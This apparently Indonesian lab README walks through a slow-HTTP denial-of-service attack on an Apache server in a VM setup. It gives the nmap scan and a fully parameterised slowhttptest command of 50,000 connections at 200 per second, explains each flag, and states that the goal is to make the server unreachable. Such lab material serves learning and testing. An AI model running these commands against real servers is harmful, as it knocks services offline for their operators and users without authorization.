<h2 align="center">Attack dengan slowhttp </h2>
بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيْم

## Bahan
- VM OS Debian 

## Tujuan
  Membuat Web Server menjadi DOWN / tidak dapat diakses

## Penggunaan 
- Konfigurasi Adapter Network pada VM anda dengan dua adapter yaitu NAT dan Host Only
- Konfigurasi Network menjadi dhcp pada adapter NAT/enp0s3 dan Static pada adapter Host Only/enp0s8,
  Contoh :
    ![image/image1.png](https://github.com/yogaputrarm/cacti-kons1/blob/main/image/image1.png)
- lakukan update repository terlebih dahulu
- lakukan instalasi slowhttptest dan NMAP, dengan perintah:
  ```
  apt install slowhttptest nmap
  ```
- Tunggu hingga proses instalasi selesai
- lakukan scanning untuk mendapatkan informasi teknologi apa saja yang digunakan pada server target, dengan perintah:
  ```
  nmap -sVC -O ip target
  ```
- setelah mendapatkan hasil scanning, pastikan terdapat port 80 yang berisi service Apache dalam keadaan terbuka
- kemudian lakukan penyerangan pada port 80, dengan perintah
  ```
  slowhttptest -c 50000 -H -r 200 -t GET -u http://ip target/ -x 24 -p 3 -l 9999
  ```
  Note :
    -c 50000 = total koneksi yang dikirimkan
    -H = memperlambat headers dari website
    -r 200 = melakukan koneksi 200/detik
    -t GET = metode GET saat request
    -u = url target //http:ip target/
    -x 24 = panjang data random yang dikirim sebanyak 24
    -p 3 = waktu saat timeout selama 3 detik
    -l 9999 = bata waktu penargetan
- Masuk pada mode monitoring penyerangan 
- Tunggu `service available` yang berawal dari "YES" menjadi "NO"
- kemudian lakukan monitoring traffik adapter nMasuetwork menggunakan wireshark 

